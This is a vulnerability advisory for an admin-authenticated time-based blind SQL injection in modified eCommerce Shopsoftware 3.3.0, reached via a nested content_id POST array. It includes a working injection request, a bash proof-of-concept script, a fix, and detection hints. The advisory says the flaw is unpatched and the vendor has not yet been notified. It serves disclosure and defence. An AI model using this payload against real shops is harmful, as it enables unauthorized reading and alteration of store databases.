# Security Advisory: SQL Injection (Time-Based Blind) via Multidimensional Array in admin/content_manager.php

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 7.2 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a time-based blind SQL injection in `admin/content_manager.php` triggered via a multidimensional POST array parameter `content_id[i][lang]`. The application's `Inputfilter` class only processes first-level array keys; since `content_id` is not in the sanitization whitelist, its nested values bypass all filtering and are concatenated directly into a SQL WHERE clause. An authenticated admin can exploit this to read or modify any database content.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/content_manager.php | rev 16825 | None | Affected |
| Component: includes/classes/inputfilter.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

### Unaffected Products

- None evaluated.

---

## 3. Vulnerability Description

When editing a content entry (`action=edit&id=update`), `content_manager.php` uses `$content_id[$i][$languages[$l]['id']]` directly in a SQL query without calling `xtc_db_input()`. The `Inputfilter` class processes `$_POST` keys at the first level only; for a parameter like `content_id[0][1]`, the top-level key is `content_id`. Since `content_id` is not in the admin whitelist and is not a price field, its entire subtree is left unprocessed. The nested value at `[0][1]` reaches the SQL query verbatim.

**Root cause:**

```php
// admin/content_manager.php:207–209
if ($id == 'update' && $content_id[$i][$languages[$l]['id']] > 0) {
    $add_and = " AND content_id != '" . $content_id[$i][$languages[$l]['id']] . "'";
    // ↑ No xtc_db_input() call — value from $_POST['content_id'][0][1]
}
$dbQuery = xtc_db_query("SELECT MAX(content_group_index)
                           FROM ".TABLE_CONTENT_MANAGER."
                          WHERE languages_id = '".$sql_data_lang_array['languages_id']."'
                                ".$add_and."
                            AND content_group = '".$sql_data_array['content_group']."'");

// includes/classes/inputfilter.php — Inputfilter only processes 1st-level keys:
// case 'content_id': // NOT in whitelist → entire array passes unfiltered
```

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** Valid admin session, CSRF token, existing content entry (coID)

---

## 4. Impact

- **Confidentiality:** High — full database read via time-based blind technique
- **Integrity:** High — arbitrary data modification via subqueries
- **Availability:** High — resource exhaustion via heavy queries

---

## 5. Classification

### CVSS

- **Score:** 7.2
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- CWE-20: Improper Input Validation (secondary — Inputfilter fails to recursively validate arrays)

### CAPEC

- CAPEC-7: Blind SQL Injection
- CAPEC-88: OS Command Injection (escalation path if FILE privileges available)

---

## 6. Exploitation Scenario

1. Attacker logs into admin panel and navigates to Content Manager.
2. Attacker notes an existing content entry ID (e.g., coID=1).
3. Attacker crafts a POST to `content_manager.php?coID=1&action=edit&id=update` with `content_id[0][1]=1' AND SLEEP(3)-- -`.
4. The Inputfilter skips the nested array; the value is placed in the SQL WHERE clause.
5. Attacker uses binary-search technique with conditional SLEEP to extract the full database.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/content_manager.php (lines 207–209)
         includes/classes/inputfilter.php (array traversal gap)
Parameter(s): content_id[0][1] (POST multidimensional array)
Method: POST · Authentication: Admin required
```

### Example Request

```http
POST /admin/content_manager.php?coID=1&action=edit&id=update HTTP/1.1
Host: TARGET
Cookie: MODsid=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<CSRF_NAME>=<CSRF_VALUE>&coID=1&content_count=1&content_group=1&sort_order=0&parent_id=0
&file_flag=0&parent_check=0&content_active[0]=1
&content_title[0][1]=Test&content_title[0][2]=Test
&content_id[0][2]=2
&content_id[0][1]=1'+AND+SLEEP(3)--+-
```

### Observed Response

```text
HTTP/1.1 200 OK
[Response time: ~3042ms]
```

### Result

Confirmed in authorized Docker lab with existing content entry coID=1. Response time of 3042ms (≥3000ms) confirms SLEEP(3) execution. Test was non-destructive.

**Evidence:** 3042ms response time; baseline <80ms.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V03 PoC — SQLi Time-Based Blind in content_manager.php (multidimensional array)
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Obtain CSRF token
PAGE=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/content_manager.php?coID=1&action=edit")
CSRF_NAME=$(echo "$PAGE" | grep -oP 'name="[A-Za-z0-9]{5,8}" value="[A-Za-z0-9]{30,40}"' | head -1 | grep -oP 'name="\K[^"]+')
CSRF_VALUE=$(echo "$PAGE" | grep -oP 'name="[A-Za-z0-9]{5,8}" value="[A-Za-z0-9]{30,40}"' | head -1 | grep -oP 'value="\K[^"]+')

# Step 2: Inject SLEEP(3) via multidimensional array content_id[0][1]
START=$(date +%s%3N)
HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/content_manager.php?coID=1&action=edit&id=update" \
  -d "${CSRF_NAME}=${CSRF_VALUE}&coID=1&content_count=1&content_group=1" \
  -d "sort_order=0&parent_id=0&file_flag=0&parent_check=0" \
  -d "content_active[0]=1&content_title[0][1]=Test&content_title[0][2]=Test" \
  -d "content_id[0][2]=2" \
  --data-urlencode "content_id[0][1]=1' AND SLEEP(3)-- -")
END=$(date +%s%3N)
echo "HTTP: $HTTP | Elapsed: $((END-START))ms"
# Expected: HTTP: 200 | Elapsed: ~3042ms
```

### Expected Result

```text
HTTP: 200 | Elapsed: ~3042ms
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Deploy authorized instance of modified eCommerce v3.3.0.
2. Log in as admin. Create or identify an existing content entry (coID=1).
3. Obtain CSRF token from `content_manager.php?coID=1&action=edit`.
4. POST to `content_manager.php?coID=1&action=edit&id=update` with the payload above.
5. Measure response time — expect ≥3 seconds.

---

## 10. Mitigation

- Apply `xtc_db_input()` to `$content_id[$i][$languages[$l]['id']]` before use in SQL.
- Extend `Inputfilter` to recursively validate multidimensional POST arrays.
- Use parameterized queries for all database operations.
- Restrict admin panel to trusted IP ranges.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// Vulnerable:
$add_and = " AND content_id != '" . $content_id[$i][$languages[$l]['id']] . "'";

// Fixed:
$add_and = " AND content_id != '" . (int)$content_id[$i][$languages[$l]['id']] . "'";
// content_id is always numeric — cast to int is the correct fix here
```

---

## 12. Detection and Indicators

- POST to `/admin/content_manager.php` with `id=update` and response time > 2 seconds.
- `content_id[*][*]` values containing SQL keywords or timing functions.

### Example Log Search

```text
grep "content_manager.php" access.log | awk '$NF > 2000'
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via static + dynamic analysis |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- CWE-20: https://cwe.mitre.org/data/definitions/20.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes. The information was obtained in an authorized environment and disclosed responsibly.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
